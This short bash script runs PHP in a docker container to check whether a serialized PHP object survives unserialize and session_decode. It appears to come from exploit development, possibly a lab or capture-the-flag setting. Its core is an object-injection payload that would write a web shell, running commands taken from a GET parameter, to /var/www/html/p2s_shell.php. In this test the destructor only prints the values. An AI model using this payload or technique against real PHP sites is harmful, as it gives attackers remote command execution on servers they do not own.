#!/bin/bash
# isolate: does the php-handler unserialize of the injected object succeed?
docker exec van85 php -n -r '
class DeferredWriter { public $path; public $data;
    public function __destruct() { var_dump("DTOR", $this->path, $this->data); } }
$s = "O:14:\"DeferredWriter\":2:{s:4:\"path\";s:26:\"/var/www/html/p2s_shell.php\";s:4:\"data\";s:29:\"<?php @system(\$_GET[\"c\"]); ?>\";}";
$r = unserialize($s);
var_dump("unserialize result:", $r);
'
echo "=== exact session-file content through session_decode ==="
docker exec van85 php -n -r '
class DeferredWriter { public $path; public $data;
    public function __destruct() { var_dump("DTOR", $this->path, $this->data); } }
ini_set("session.serialize_handler", "php");
session_id("zzz00000000000000000000000000");
$f = file_get_contents("/tmp/sess_p2s000000000000000000000000000");
var_dump("raw len:", strlen($f));
echo $f, "\n";
'
